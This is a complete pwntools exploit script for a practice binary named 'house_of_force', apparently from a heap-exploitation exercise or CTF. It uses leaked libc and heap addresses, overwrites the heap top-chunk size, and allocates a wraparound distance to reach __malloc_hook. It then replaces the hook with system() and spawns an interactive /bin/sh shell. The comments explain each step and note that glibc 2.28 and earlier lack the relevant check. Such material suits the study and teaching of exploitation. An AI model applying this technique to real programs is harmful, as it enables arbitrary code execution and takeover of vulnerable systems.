#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

# overwriting the size of the top-chunk (since in glibc<=2.28 there is no integrity check for it)
malloc(24, b"A"*24 + p64(0xffffffffffffffff))

# Calculating the distance between malloc hook (which is a fn pointer) and the end of allocated chunk 
distance = (libc.sym["__malloc_hook"] - 0x20) - (heap + 0x20)

# Allocating the distance and writing "/bin/sh" into a newly allocated chunk
malloc(distance, b"/bin/sh\x00")

# Overwriting the malloc hook with system's address
malloc(24, p64(libc.sym["system"]))

# Calling the system with a pointer to "/bin/sh"
malloc(heap + 0x30, "\x00")

# Alternatively (no need to write "/bin/sh"):
# malloc(next(libc.search(b"/bin/sh\x00")), "\x00")

io.interactive()
